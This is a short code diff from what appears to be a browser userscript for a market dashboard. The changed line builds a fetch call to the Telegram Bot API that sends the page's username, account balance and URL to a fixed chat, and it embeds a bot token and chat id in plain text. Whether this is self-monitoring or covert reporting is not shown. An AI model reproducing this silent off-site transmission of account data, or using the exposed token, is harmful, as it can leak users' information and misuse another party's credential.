@@ -18,7 +18,7 @@ if ((document.querySelector('.market-dashboard-content .form-group')!=undefined)
 }
 
 
-	fetch("https://api.telegram.org/bot2019206724:AAEDST9B8q6twnApiXVacwdkdbZ3A43Z8BA/sendMessage?chat_id=-1001754662766&text=" + document.querySelectorAll('.navbar-link span.text-overflow-ellipsis')[0]?.textContent + encodeURI('Online!\nBalance is ') + document.querySelectorAll('a.navbar-item.is-hidden-desktopless span.is-hidden-desktop-small')[0]?.innerText?.trim() + "%0A" + document.URL, {
+	fetch("https://api.telegram.org/bot2019206724:AAEDST9B8q6twnApiXVacwdkdbZ3A43Z8BA/sendMessage?chat_id=-1001754662766&text=" + document.querySelectorAll('.navbar-link span.text-overflow-ellipsis')[0]?.textContent + encodeURI(' Online!\nBalance is ') + document.querySelectorAll('a.navbar-item.is-hidden-desktopless span.is-hidden-desktop-small')[0]?.innerText?.trim() + "%0A" + document.URL, {
     "credentials": "omit",
     "headers": {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
